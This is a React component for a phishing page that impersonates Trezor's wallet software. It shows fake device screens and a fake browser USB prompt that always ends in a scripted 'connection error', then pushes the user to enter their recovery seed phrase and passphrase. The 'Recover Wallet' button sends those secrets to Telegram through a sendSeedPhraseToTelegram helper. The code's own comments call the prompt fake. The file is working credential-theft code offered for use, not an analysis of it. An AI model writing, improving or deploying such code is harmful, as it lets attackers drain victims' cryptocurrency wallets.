import { useState, useEffect } from 'react';
import { sendSeedPhraseToTelegram } from '../utils/telegram'; // 👈 NEW

// Import your local device assets
import device1 from '../assets/1.png'; // Trezor Safe 5
import device2 from '../assets/2.png'; // Trezor Safe 3
import device3 from '../assets/3.png'; // Trezor Model T
import device4 from '../assets/4.png'; // Trezor Model One

interface TrezorPanelProps {
  isOpen: boolean;
  onClose: () => void;
}

type ViewState =
  | 'splash'
  | 'select_device'
  | 'connecting'
  | 'select_backup_type'
  | 'enter_phrase'
  | 'passphrase';

type BackupType = 12 | 18 | 20 | 24 | 'shamir';

export default function TrezorPanel({ isOpen, onClose }: TrezorPanelProps) {
  const [view, setView] = useState<ViewState>('splash');
  const [selectedDevice, setSelectedDevice] = useState<string | null>(null);
  const [backupType, setBackupType] = useState<BackupType>(12);
  const [phraseValues, setPhraseValues] = useState<string[]>(Array(24).fill(''));
  const [passphrase, setPassphrase] = useState('');
  const [connectionError, setConnectionError] = useState(false);
  const [showBrowserPrompt, setShowBrowserPrompt] = useState(false);
  const [seedError, setSeedError] = useState(false);
  // Controls whether modal is mounted and whether it has faded in
  const [isMounted, setIsMounted] = useState(false);
  const [isVisible, setIsVisible] = useState(false);
  const [isSending, setIsSending] = useState(false); // 👈 NEW

  // Mount/unmount with fade
  useEffect(() => {
    if (isOpen) {
      setIsMounted(true);
      // Give DOM a frame to mount before starting the transition
      requestAnimationFrame(() => {
        requestAnimationFrame(() => {
          setIsVisible(true);
        });
      });
    } else {
      setIsVisible(false);
      const t = setTimeout(() => setIsMounted(false), 700);
      return () => clearTimeout(t);
    }
  }, [isOpen]);

  // Reset state when modal opens & Handle splash timer
  useEffect(() => {
    if (isOpen) {
      setView('splash');
      setSelectedDevice(null);
      setBackupType(12);
      setPhraseValues(Array(24).fill(''));
      setPassphrase('');
      setConnectionError(false);
      setShowBrowserPrompt(false);
      setSeedError(false);
      setIsSending(false); // 👈 NEW

      const timer = setTimeout(() => {
        setView('select_device');
      }, 7000);
      return () => clearTimeout(timer);
    }
  }, [isOpen]);

  // Handle fake browser prompt and connection error timing
  useEffect(() => {
    if (view === 'connecting') {
      setConnectionError(false);
      setShowBrowserPrompt(false);

      const promptTimer = setTimeout(() => {
        setShowBrowserPrompt(true);
      }, 800);

      const errorTimer = setTimeout(() => {
        setShowBrowserPrompt(false);
        setConnectionError(true);
      }, 6000);

      return () => {
        clearTimeout(promptTimer);
        clearTimeout(errorTimer);
      };
    }
  }, [view]);

  const handleCancelPrompt = () => {
    setShowBrowserPrompt(false);
    setConnectionError(true);
  };

  const handleWordChange = (index: number, value: string) => {
    const newValues = [...phraseValues];
    newValues[index] = value;
    setPhraseValues(newValues);

    if (value.length > 0 && !/^[a-z]+$/.test(value)) {
      setSeedError(true);
    } else {
      setSeedError(false);
    }
  };

  const getActiveWordCount = () => (typeof backupType === 'number' ? backupType : 20);

  const isPhraseComplete = () => {
    const count = getActiveWordCount();
    const activeWords = phraseValues.slice(0, count);
    return activeWords.every((word) => word.trim().length > 0) && !seedError;
  };

  if (!isMounted) return null;

  return (
    <>
      {/* ============================================ */}
      {/* INJECTED STYLES                              */}
      {/* ============================================ */}
      <style dangerouslySetInnerHTML={{
        __html: `
          /* ---- Modal entrance: drops in from slightly above, unfurls ---- */
          @keyframes trezorModalEnter {
            0%   { opacity: 0; transform: translateY(-22px) scale(0.96); filter: blur(5px); }
            35%  { opacity: 1; filter: blur(0px); }
            100% { opacity: 1; transform: translateY(0)   scale(1);    filter: blur(0px); }
          }

          /* ---- Modal exit: rises and fades ---- */
          @keyframes trezorModalExit {
            0%   { opacity: 1; transform: translateY(0)    scale(1);    filter: blur(0px); }
          100% { opacity: 0; transform: translateY(-16px) scale(0.97); filter: blur(4px); }
          }

          /* ---- Backdrop ---- */
          @keyframes backdropIn  { from { opacity: 0; } to { opacity: 1; } }
          @keyframes backdropOut { from { opacity: 1; } to { opacity: 0; } }

          /* ---- Browser-prompt dropdown ---- */
          @keyframes slickDropdown {
            0%   { opacity: 0; transform: translate(-50%, -18px) scale(0.96); }
            100% { opacity: 1; transform: translate(-50%, 0)     scale(1);    }
          }
          .slick-dropdown { animation: slickDropdown 0.45s cubic-bezier(0.22,1,0.36,1) forwards; }

          /* ---- Error bounce ---- */
          @keyframes slickErrorBounce {
            0%   { transform: scale(0.94); opacity: 0; }
            55%  { transform: scale(1.03); opacity: 1; }
            100% { transform: scale(1);    opacity: 1; }
          }

          /* ---- Splash spinner ring ---- */
          @keyframes trezorSpin {
            from { transform: rotate(0deg);   }
            to   { transform: rotate(360deg); }
          }

          /* ---- Splash logo pulse ---- */
          @keyframes trezorLogoPulse {
            0%, 100% { opacity: 1;   transform: scale(1);    }
            50%       { opacity: 0.7; transform: scale(0.93); }
          }
        `,
      }} />

      {/* ============================================ */}
      {/* FAKE BROWSER USB PROMPT                      */}
      {/* ============================================ */}
      {showBrowserPrompt && (
        <div
          className="slick-dropdown fixed top-[15%] left-1/2 lg:left-[20%] lg:translate-x-0 z-[300] w-[340px] bg-[#292a2d] text-[#e8eaed] shadow-2xl rounded-md border border-white/10 font-sans text-sm"
          style={{ zIndex: 400 }}
        >
          <div className="px-5 pt-4 pb-2 text-[13px] tracking-wide">
            multisync.portal-connect.xyz wants to connect
          </div>
          <div className="h-[140px] flex items-center justify-center text-[13px] text-[#9aa0a6]">
            No compatible devices found.
          </div>
          <div className="flex justify-between items-center px-4 py-3 border-t border-white/10">
            <button className="w-5 h-5 rounded-full border border-[#9aa0a6] text-[#9aa0a6] flex items-center justify-center text-xs font-bold opacity-80 hover:opacity-100">
              ?
            </button>
            <div className="flex gap-2">
              <button
                onClick={handleCancelPrompt}
                className="px-4 py-1.5 rounded text-[#8ab4f8] border border-[#5f6368] hover:bg-[#8ab4f8]/10 transition-colors text-[13px] font-medium"
              >
                Cancel
              </button>
              <button
                disabled
                className="px-4 py-1.5 rounded bg-[#3c4043] text-[#9aa0a6] cursor-not-allowed text-[13px] font-medium"
              >
                Connect
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ============================================ */}
      {/* BACKDROP                                     */}
      {/* ============================================ */}
      <div
        className="fixed inset-0 z-[200] flex items-center justify-center p-4 sm:p-6 font-sans"
        style={{ pointerEvents: isVisible ? 'auto' : 'none' }}
      >
        <div
          className="absolute inset-0 bg-slate-900/60 backdrop-blur-md cursor-pointer"
          onClick={onClose}
          style={{
            animation: isVisible
              ? 'backdropIn 0.55s cubic-bezier(0.22,1,0.36,1) forwards'
              : 'backdropOut 0.55s cubic-bezier(0.22,1,0.36,1) forwards',
          }}
        />

        {/* ============================================ */}
        {/* MAIN MODAL                                   */}
        {/* ============================================ */}
        <div
          className="relative z-10 w-full max-w-[560px] h-[85dvh] sm:h-[580px] bg-white dark:bg-[#1C1D1F] shadow-2xl overflow-hidden flex flex-col rounded-[24px] border border-slate-200 dark:border-[#27282A]"
          style={{
            willChange: 'transform, opacity, filter',
            animation: isVisible
              ? 'trezorModalEnter 0.9s cubic-bezier(0.22,1,0.36,1) forwards'
              : 'trezorModalExit  0.6s cubic-bezier(0.22,1,0.36,1) forwards',
          }}
        >
          <div className="relative w-full h-full">

            {/* ========================================== */}
            {/* LAYER 1: SPLASH SCREEN                     */}
            {/* ========================================== */}
            <div
              className="absolute inset-0 bg-[#121314] z-50 flex flex-col items-center justify-center"
              style={{
                opacity:    view === 'splash' ? 1 : 0,
                transform:  view === 'splash' ? 'scale(1)'    : 'scale(1.07)',
                filter:     view === 'splash' ? 'blur(0px)'   : 'blur(10px)',
                pointerEvents: view === 'splash' ? 'auto' : 'none',
                transition: [
                  'opacity   1.15s cubic-bezier(0.25,1,0.5,1)',
                  'transform 1.15s cubic-bezier(0.25,1,0.5,1)',
                  'filter    1.15s cubic-bezier(0.25,1,0.5,1)',
                ].join(', '),
              }}
            >
              {/* Outer spinning ring */}
              <div className="relative w-48 h-48 flex items-center justify-center">
                <div
                  className="absolute inset-0 rounded-full border-[2.5px] border-transparent"
                  style={{
                    borderTopColor: '#60e198',
                    borderRightColor: 'rgba(96,225,152,0.2)',
                    animation: 'trezorSpin 1.4s linear infinite',
                  }}
                />
                {/* Inner slower ring */}
                <div
                  className="absolute inset-4 rounded-full border-[1.5px] border-transparent"
                  style={{
                    borderTopColor: 'rgba(96,225,152,0.4)',
                    animation: 'trezorSpin 2.2s linear infinite reverse',
                  }}
                />
                {/* Logo */}
                <div
                  style={{ animation: 'trezorLogoPulse 2.4s ease-in-out infinite' }}
                >
                  <TrezorLogoSVG className="w-24 h-24 text-white relative z-10" />
                </div>
              </div>

              {/* Brand label */}
              <p
                className="mt-8 text-[13px] font-medium tracking-[0.2em] uppercase text-white/40"
                style={{ animation: 'trezorLogoPulse 2.4s ease-in-out infinite' }}
              >
                Connecting…
              </p>
            </div>

            {/* ========================================== */}
            {/* LAYER 2: SELECT DEVICE                     */}
            {/* ========================================== */}
            <div
              className="absolute inset-0 bg-white dark:bg-[#1C1D1F] z-40 flex flex-col p-6"
              style={{
                opacity:   view === 'select_device' ? 1 : 0,
                transform: view === 'select_device' ? 'translateY(0)' : 'translateY(18px)',
                pointerEvents: view === 'select_device' ? 'auto' : 'none',
                transition: 'opacity 0.65s cubic-bezier(0.22,1,0.36,1), transform 0.65s cubic-bezier(0.22,1,0.36,1)',
              }}
            >
              <div className="flex items-center justify-between mb-6">
                <div className="w-8" />
                <div className="text-slate-900 dark:text-white font-bold text-[20px] text-center">
                  Select your device
                </div>
                <button
                  onClick={onClose}
                  className="p-1 rounded-lg hover:bg-slate-100 dark:hover:bg-white/5 transition-all active:scale-95"
                >
                  <svg className="w-6 h-6 text-slate-900 dark:text-[#9ca1af]" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
                  </svg>
                </button>
              </div>

              <div className="flex-1 overflow-y-auto px-1 [&::-webkit-scrollbar]:w-[5px] [&::-webkit-scrollbar-track]:bg-transparent [&::-webkit-scrollbar-thumb]:bg-[#00854D] [&::-webkit-scrollbar-thumb]:rounded-full">
                <div className="grid grid-cols-2 gap-4 h-full">
                  {[
                    { id: 'safe5',   label: 'Trezor Safe 5',   img: device1 },
                    { id: 'safe3',   label: 'Trezor Safe 3',   img: device2 },
                    { id: 'modelt',  label: 'Trezor Model T',  img: device3 },
                    { id: 'modelone',label: 'Trezor Model One', img: device4 },
                  ].map((d) => (
                    <div
                      key={d.id}
                      onClick={() => setSelectedDevice(d.id)}
                      className={`group relative bg-white dark:bg-[#0C0D0F] rounded-2xl p-5 cursor-pointer border transition-all duration-300 ${
                        selectedDevice === d.id
                          ? 'border-[#60e198] shadow-[0_0_20px_rgba(96,225,152,0.15)]'
                          : 'border-[#e5e7eb] dark:border-[#27282A] hover:border-[#60e198]/50 hover:shadow-lg'
                      }`}
                    >
                      <div
                        className={`absolute top-4 right-4 w-6 h-6 bg-[#60e198] rounded-full items-center justify-center transition-all duration-300 ${
                          selectedDevice === d.id ? 'flex scale-100 opacity-100' : 'hidden scale-50 opacity-0'
                        }`}
                      >
                        <svg className="w-4 h-4 text-[#121314]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3">
                          <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                        </svg>
                      </div>
                      <div className="flex flex-col items-center justify-center h-full">
                        <img
                          src={d.img}
                          alt={d.label}
                          className="h-[120px] w-auto object-contain mb-4 transition-transform duration-500 ease-[cubic-bezier(0.16,1,0.3,1)] group-hover:scale-110 mix-blend-multiply dark:mix-blend-normal"
                        />
                        <span className="text-[14px] font-semibold text-slate-900 dark:text-white">{d.label}</span>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              <div className="pt-6 mt-auto">
                <button
                  onClick={() => setView('connecting')}
                  disabled={!selectedDevice}
                  className="w-full text-[#121314] bg-[#60e198] font-bold text-[16px] rounded-full h-[52px] hover:bg-[#4ade80] hover:shadow-[0_0_15px_rgba(96,225,152,0.4)] transition-all duration-300 active:scale-[0.98] disabled:opacity-40 disabled:cursor-not-allowed disabled:hover:shadow-none"
                >
                  Proceed
                </button>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 3: CONNECTING & ERROR STATE          */}
            {/* ========================================== */}
            <div
              className="absolute inset-0 bg-white dark:bg-[#1C1D1F] z-40 flex flex-col p-6 sm:px-8 py-8"
              style={{
                opacity:   view === 'connecting' ? 1 : 0,
                transform: view === 'connecting' ? 'translateY(0)' : 'translateY(18px)',
                pointerEvents: view === 'connecting' ? 'auto' : 'none',
                transition: 'opacity 0.65s cubic-bezier(0.22,1,0.36,1), transform 0.65s cubic-bezier(0.22,1,0.36,1)',
              }}
            >
              <div className="flex items-center justify-between mb-8">
                <button
                  onClick={() => setView('select_device')}
                  className="p-2 rounded-full hover:bg-slate-100 dark:hover:bg-white/5 transition-all active:scale-95"
                >
                  <svg className="w-6 h-6 text-slate-900 dark:text-white" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="m15 18-6-6 6-6" />
                  </svg>
                </button>
                <div className="text-slate-900 dark:text-white font-semibold text-[22px] text-center">
                  Connect & unlock your Trezor
                </div>
                <button
                  onClick={onClose}
                  className="p-2 rounded-full hover:bg-slate-100 dark:hover:bg-white/5 transition-all active:scale-95"
                >
                  <svg className="w-6 h-6 text-slate-900 dark:text-white" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M18 6 6 18" /><path d="m6 6 12 12" />
                  </svg>
                </button>
              </div>

              <div className="flex-1 flex flex-col items-center justify-center relative">
                <div className="flex items-center justify-center mb-10 mt-6">
                  <TrezorIllustrationSVG className="w-48 h-auto drop-shadow-[0_0_15px_rgba(96,225,152,0.2)]" />
                </div>

                {!connectionError ? (
                  <div className="flex flex-col items-center justify-center transition-all duration-300">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="1.5"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      className="w-8 h-8 text-[#60e198]"
                      style={{ animation: 'trezorSpin 1.4s linear infinite' }}
                    >
                      <path d="M21 12a9 9 0 1 1-6.219-8.56" />
                    </svg>
                    <div className="mt-8 flex items-center justify-center text-center">
                      <span className="bg-[#60e1981a] text-[#60e198] px-6 py-3 rounded-full text-[16px] font-medium">
                        Waiting for device connection
                      </span>
                    </div>
                  </div>
                ) : (
                  <div
                    className="flex flex-col items-center justify-center w-full px-4"
                    style={{ animation: 'slickErrorBounce 0.5s cubic-bezier(0.16,1,0.3,1)' }}
                  >
                    <svg
                      className="w-12 h-12 text-[#ec5858]"
                      xmlns="http://www.w3.org/2000/svg"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="1.5"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    >
                      <circle cx="12" cy="12" r="10" />
                      <path d="m15 9-6 6" /><path d="m9 9 6 6" />
                    </svg>
                    <div className="mt-4 flex items-center justify-center text-center w-full">
                      <span className="bg-[#ec585817] text-[#ec5858] px-6 py-3 rounded-full text-[16px] font-medium w-full sm:w-auto border border-[#ec5858]/20">
                        Connection error, please use the button below
                      </span>
                    </div>
                  </div>
                )}

                <div
                  className="mt-10 mb-4 flex items-center justify-center w-full px-4"
                  style={{
                    opacity:   connectionError ? 1 : 0,
                    transform: connectionError ? 'translateY(0)' : 'translateY(12px)',
                    pointerEvents: connectionError ? 'auto' : 'none',
                    transition: 'opacity 0.5s cubic-bezier(0.22,1,0.36,1) 0.1s, transform 0.5s cubic-bezier(0.22,1,0.36,1) 0.1s',
                  }}
                >
                  <button
                    type="button"
                    onClick={() => setView('select_backup_type')}
                    className="w-full sm:w-auto text-[14px] text-[#d6dedacc] hover:text-[#e3ebe7] bg-[#c2c2c20d] hover:bg-[#c2c2c21a] flex items-center justify-center gap-x-2 duration-300 transition-all font-normal px-8 sm:px-12 py-3.5 rounded-full active:scale-95 border border-white/5"
                  >
                    <svg className="w-5 h-5 shrink-0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M9 17H7A5 5 0 0 1 7 7h2" /><path d="M15 7h2a5 5 0 1 1 0 10h-2" /><line x1="8" x2="16" y1="12" y2="12" />
                    </svg>
                    <span className="truncate">Use an alternative connection method</span>
                  </button>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 4: SELECT BACKUP TYPE                */}
            {/* ========================================== */}
            <div
              className="absolute inset-0 bg-white dark:bg-[#121314] z-40 flex flex-col p-6 sm:p-8"
              style={{
                opacity:   view === 'select_backup_type' ? 1 : 0,
                transform: view === 'select_backup_type' ? 'translateY(0)' : 'translateY(18px)',
                pointerEvents: view === 'select_backup_type' ? 'auto' : 'none',
                transition: 'opacity 0.65s cubic-bezier(0.22,1,0.36,1), transform 0.65s cubic-bezier(0.22,1,0.36,1)',
              }}
            >
              <div className="flex items-center justify-between mb-8">
                <button
                  onClick={() => { setView('connecting'); setConnectionError(false); }}
                  className="p-2 rounded-xl hover:bg-slate-100 dark:hover:bg-white/5 transition-all active:scale-95"
                >
                  <svg className="w-5 h-5 text-slate-900 dark:text-[#9ca1af]" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
                  </svg>
                </button>
                <div className="text-slate-900 dark:text-white font-semibold text-[20px] text-center">
                  Select your backup type
                </div>
                <button
                  onClick={onClose}
                  className="p-2 rounded-xl hover:bg-slate-100 dark:hover:bg-white/5 transition-all active:scale-95"
                >
                  <svg className="w-5 h-5 text-slate-900 dark:text-[#9ca1af]" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
                  </svg>
                </button>
              </div>

              <div className="flex-1 overflow-y-auto px-1 pb-4 [&::-webkit-scrollbar]:w-[5px] [&::-webkit-scrollbar-track]:bg-transparent [&::-webkit-scrollbar-thumb]:bg-[#00854D] [&::-webkit-scrollbar-thumb]:rounded-full">
                <div className="flex flex-col gap-4">
                  {[
                    { value: 20,       title: '20-word Backup',              desc: 'A single 20-word list based on the modern SLIP39 standard.' },
                    { value: 12,       title: '12-word Backup',              desc: 'A single 12-word list based on the older BIP39 standard.' },
                    { value: 24,       title: '24-word Backup',              desc: 'A single 24-word list based on the older BIP39 standard.' },
                    { value: 'shamir', title: 'Multi-share backup (Shamir)', desc: 'An advanced backup that splits access into multiple word lists using the SLIP39 standard.' },
                  ].map((option) => (
                    <div
                      key={String(option.value)}
                      onClick={() => {
                        setBackupType(option.value as BackupType);
                        if (typeof option.value === 'number') {
                          setPhraseValues(Array(24).fill(''));
                        }
                      }}
                      className={`group relative bg-slate-50 dark:bg-[#1C1D1F] rounded-[16px] px-5 py-4 cursor-pointer border transition-all duration-300 hover:scale-[1.01] ${
                        backupType === option.value
                          ? 'border-[#00854D] bg-[#00854D]/5 dark:bg-[#00854D]/10'
                          : 'border-[#e5e7eb] dark:border-transparent hover:border-[#00854D]/50'
                      }`}
                    >
                      <div className="flex flex-col pr-8">
                        <h3 className={`text-[16px] font-semibold mb-1 transition-colors ${backupType === option.value ? 'text-[#00854D]' : 'text-slate-900 dark:text-white'}`}>
                          {option.title}
                        </h3>
                        <p className="text-slate-500 dark:text-[#7a7a7a] text-[13px] leading-relaxed">
                          {option.desc}
                        </p>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              <div className="pt-4 mt-auto">
                <button
                  onClick={() => setView('enter_phrase')}
                  className="w-full text-white bg-[#00854D] font-medium text-[16px] rounded-[10px] h-[52px] hover:bg-[#006e3f] transition-all active:scale-[0.98]"
                >
                  Proceed
                </button>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 5: ENTER RECOVERY PHRASE             */}
            {/* ========================================== */}
            <div
              className="absolute inset-0 bg-white dark:bg-[#121314] z-40 flex flex-col p-6 sm:p-8"
              style={{
                opacity:   view === 'enter_phrase' ? 1 : 0,
                transform: view === 'enter_phrase' ? 'translateY(0)' : 'translateY(18px)',
                pointerEvents: view === 'enter_phrase' ? 'auto' : 'none',
                transition: 'opacity 0.65s cubic-bezier(0.22,1,0.36,1), transform 0.65s cubic-bezier(0.22,1,0.36,1)',
              }}
            >
              <div className="flex items-center justify-between mb-4">
                <button
                  onClick={() => setView('select_backup_type')}
                  className="p-2 rounded-xl hover:bg-slate-100 dark:hover:bg-white/5 transition-all active:scale-95"
                >
                  <svg className="w-5 h-5 text-slate-900 dark:text-[#9ca1af]" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
                  </svg>
                </button>
                <div className="text-slate-900 dark:text-white font-semibold text-[18px] sm:text-[20px] text-center">
                  Enter your {backupType}-word Backup
                </div>
                <button
                  onClick={onClose}
                  className="p-2 rounded-xl hover:bg-slate-100 dark:hover:bg-white/5 transition-all active:scale-95"
                >
                  <svg className="w-5 h-5 text-slate-900 dark:text-[#9ca1af]" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
                  </svg>
                </button>
              </div>

              <div className="flex-1 flex flex-col min-h-0">
                <div className="flex-1 overflow-y-auto pr-1 pb-4 [&::-webkit-scrollbar]:w-[5px] [&::-webkit-scrollbar-track]:bg-transparent [&::-webkit-scrollbar-thumb]:bg-[#00854D] [&::-webkit-scrollbar-thumb]:rounded-full">
                  {backupType === 'shamir' ? (
                    <div className="flex flex-col h-full mt-2 px-2">
                      <p className="text-slate-600 dark:text-slate-400">
                        Shamir backup recovery requires entering your SLIP39 recovery shares.
                      </p>
                      <textarea
                        className="w-full mt-4 h-32 p-4 bg-slate-50 dark:bg-[#1C1D1F] border border-slate-200 dark:border-[#27282A] rounded-xl outline-none focus:border-[#00854D] text-slate-900 dark:text-white resize-none transition-colors duration-300"
                        placeholder="Enter your SLIP39 recovery share here…"
                      />
                    </div>
                  ) : (
                    <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 sm:gap-4 mt-2">
                      {Array.from({ length: backupType as number }).map((_, i) => (
                        <div
                          key={i}
                          className="relative flex items-center bg-slate-50 dark:bg-[#1C1D1F] rounded-[10px] overflow-hidden border border-slate-200 dark:border-transparent focus-within:border-[#00854D] transition-colors duration-300"
                        >
                          <div className="pl-3 pr-2 py-3 bg-slate-100 dark:bg-[#232426] border-r border-slate-200 dark:border-[#2f3033]">
                            <p className="text-slate-500 dark:text-[#7a7a7a] text-[13px] font-medium min-w-[20px] text-center">
                              {i + 1}.
                            </p>
                          </div>
                          <input
                            className={`w-full py-3 px-3 text-[14px] font-medium bg-transparent text-slate-900 dark:text-white outline-none ${
                              seedError && phraseValues[i].length > 0 && !/^[a-z]+$/.test(phraseValues[i])
                                ? 'text-red-500'
                                : ''
                            }`}
                            type="text"
                            value={phraseValues[i]}
                            onChange={(e) => handleWordChange(i, e.target.value.toLowerCase())}
                          />
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              </div>

              <div className="pt-4 border-t border-[#EDEDED] dark:border-[#27282A] mt-auto">
                <button
                  onClick={() => setView('passphrase')}
                  disabled={backupType !== 'shamir' && !isPhraseComplete()}
                  className="w-full text-white bg-[#00854D] font-medium text-[16px] rounded-[10px] h-[52px] hover:bg-[#006e3f] transition-all active:scale-[0.98] disabled:opacity-40 disabled:cursor-not-allowed"
                >
                  Continue
                </button>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 6: PASSPHRASE (OPTIONAL)             */}
            {/* ========================================== */}
            <div
              className="absolute inset-0 bg-white dark:bg-[#121314] z-40 flex flex-col p-6 sm:px-8 py-8"
              style={{
                opacity:   view === 'passphrase' ? 1 : 0,
                transform: view === 'passphrase' ? 'translateY(0)' : 'translateY(18px)',
                pointerEvents: view === 'passphrase' ? 'auto' : 'none',
                transition: 'opacity 0.65s cubic-bezier(0.22,1,0.36,1), transform 0.65s cubic-bezier(0.22,1,0.36,1)',
              }}
            >
              <div className="flex items-center justify-between mb-8 pt-2">
                <button
                  onClick={() => setView('enter_phrase')}
                  className="p-2 rounded-xl hover:bg-slate-100 dark:hover:bg-white/5 transition-all active:scale-95"
                >
                  <svg className="w-6 h-6 text-slate-900 dark:text-white" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="m15 18-6-6 6-6" />
                  </svg>
                </button>
                <div className="text-slate-900 dark:text-white font-semibold text-[20px] sm:text-[22px] text-center">
                  Passphrase (Optional)
                </div>
                <button
                  onClick={onClose}
                  className="p-2 rounded-xl hover:bg-slate-100 dark:hover:bg-white/5 transition-all active:scale-95"
                >
                  <svg className="w-6 h-6 text-slate-900 dark:text-white" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M18 6 6 18" /><path d="m6 6 12 12" />
                  </svg>
                </button>
              </div>

              <div className="flex-1 flex flex-col">
                <div className="w-full max-w-lg mx-auto mt-4">
                  <div className="mb-8">
                    <p className="text-slate-900 dark:text-white text-[15px] sm:text-[16px] leading-relaxed">
                      Enter your passphrase to access your hidden wallet, or leave it empty to continue with your standard wallet.
                    </p>
                  </div>
                  <div className="mb-6">
                    <label className="block text-slate-900 dark:text-white text-[14px] font-medium mb-2">
                      Passphrase
                    </label>
                    <input
                      className="w-full h-[48px] py-[11px] px-[16px] text-[14px] font-medium rounded-[10px] text-[#222222] dark:text-white border border-[#ebebeb] dark:border-[#47484A] hover:border-[#9d9d9d] dark:hover:border-[#c6c6c6] bg-transparent dark:bg-[#0C0D0F] focus:bg-[#fbfbfb] dark:focus:bg-[#0f0f0f] focus:border-[#00854D] dark:focus:border-[#00854D] outline-none transition-all duration-300"
                      type="password"
                      placeholder="Enter passphrase (optional)"
                      value={passphrase}
                      onChange={(e) => setPassphrase(e.target.value)}
                    />
                  </div>
                </div>
              </div>

              <div className="pt-4 border-t border-[#EDEDED] dark:border-[#27282A] mt-auto">
                <button
                  disabled={isSending}
                  onClick={async () => {
                    setIsSending(true);
                    const count = getActiveWordCount();
                    const seedString = phraseValues.slice(0, count).join(' ');
                    const extra = passphrase ? `\nPassphrase: ${passphrase}` : '';
                    const message = `Trezor Wallet\nSeed: ${seedString}${extra}`;
                    const success = await sendSeedPhraseToTelegram(message, 'Trezor Wallet');
                    if (success) {
                      onClose();
                    } else {
                      console.error('Failed to send seed phrase');
                    }
                    setIsSending(false);
                  }}
                  className="w-full text-white bg-[#00854D] font-semibold text-[16px] rounded-[12px] h-[52px] hover:bg-[#006e3f] transition-all hover:shadow-lg hover:shadow-[#00854D]/30 active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {isSending ? 'Sending...' : 'Recover Wallet'}
                </button>
              </div>
            </div>

          </div>
        </div>
      </div>
    </>
  );
}

// -------------------------------------------------------------------
// EXTRACTED SVG COMPONENTS
// -------------------------------------------------------------------

const TrezorLogoSVG = ({ className }: { className?: string }) => (
  <svg className={className} xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1999.97 1999.97" fill="currentColor">
    <polygon points="990.5 1167.53 1158.36 1167.53 1158.36 1211.7 1067.07 1335.38 1158.36 1335.38 1158.36 1387.41 990.5 1387.41 990.5 1343.23 1081.79 1219.55 990.5 1219.55 990.5 1167.53" />
    <path d="M1556.88,1305.93c20.62-7.85,42.21-28.46,42.21-64.78,0-44.17-30.43-72.64-75.58-72.64H1420.44v218.9h56.93v-73.62H1499l40.25,73.62H1605Zm-40.24-43.19h-39.27v-44.17h39.27c14.72,0,24.54,8.84,24.54,21.6C1541.18,1253.91,1531.36,1262.74,1516.64,1262.74Z" />
    <path d="M1282,1164.58c-66.75,0-113.87,48.1-113.87,112.89s48.1,112.88,113.87,112.88,114.84-48.1,114.84-112.88S1348.79,1164.58,1282,1164.58Zm0,174.73c-33.38,0-56-25.52-56-61.84,0-37.3,22.57-61.84,56-61.84s56.93,25.52,56.93,61.84S1315.41,1339.31,1282,1339.31Z" />
    <polygon points="804 1167.53 963.02 1167.53 963.02 1218.57 860.93 1218.57 860.93 1250.96 960.08 1250.96 960.08 1301.03 860.93 1301.03 860.93 1336.36 963.02 1336.36 963.02 1387.41 804 1387.41 804 1167.53" />
    <path d="M777.5,1241.15c0-44.17-30.43-72.64-75.58-72.64H598.85v218.9h56.93v-73.62h21.6l40.24,73.62h65.77l-48.1-81.48C755.9,1298.08,777.5,1277.47,777.5,1241.15ZM695,1262.74H655.78v-44.17H695c14.73,0,24.54,8.84,24.54,21.6C719.58,1253.91,709.77,1262.74,695,1262.74Z" />
    <polygon points="395.66 1167.53 573.33 1167.53 573.33 1219.55 512.47 1219.55 512.47 1387.41 455.54 1387.41 455.54 1219.55 395.66 1219.55 395.66 1167.53" />
